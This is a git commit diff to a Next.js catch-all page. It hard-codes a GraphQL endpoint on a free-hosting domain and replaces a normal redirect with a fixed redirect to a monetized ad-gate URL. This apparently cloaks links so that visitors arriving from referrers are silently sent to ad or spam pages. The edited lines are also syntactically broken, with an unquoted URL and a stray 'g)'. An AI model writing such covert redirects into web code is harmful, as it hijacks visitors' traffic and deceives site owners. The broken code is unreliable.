bcaba0546e117b97a50f1d94113b15bbb994b3f4
salmanahmad12345 <135266756+salmanahmad12345@users.noreply.github.com>
2023-06-02 11:16:21 -0700

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const endpoint = https://qouts.000webhostapp.com/graphql
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,8 +19,8 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
-				}`,
+					`https://www.highrevenuegate.com/wzi57g298?key=a2a3034fd79b98a4500f65d0dadef29f/`
+				}`,g)
 			},
 		};
 		}
